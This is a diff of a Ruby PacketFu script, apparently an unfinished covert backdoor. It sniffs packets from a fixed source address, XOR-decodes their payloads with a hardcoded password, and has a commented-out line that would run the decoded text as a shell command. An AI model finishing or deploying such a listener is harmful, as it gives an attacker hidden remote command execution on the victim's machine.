@@ -5,7 +5,7 @@ require 'pp'
                     #important website http://www.rubydoc.info/github/todb/packetfu/frames/PacketFu/Inject
 include PacketFu
 $password = "zdehjk"
-
+#$cmd = ''
 
   def xor(payload)
     output = ''
@@ -27,14 +27,15 @@ iface = ARGV[0] || "em1"
 
 # Opens up the nic for capture.
 def sniff(iface)
-  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and dst port 8080 and src port 11234')
+  pp 'Sniffing...'
+  cap = Capture.new(:iface => iface, :start => true, :filter => 'src 192.168.0.7')
   cap.stream.each do |p|
+    pp 'Got one!'
     packet = Packet.parse p
     pp packet
-    cmd = xor packet.payload
-    pp cmd
+    #$cmd = xor packet.payload
     pp packet.payload
-    #value = `cmd`
+    #value = `#{cmd}`
 
     pp packet.ip_dst_readable
   end
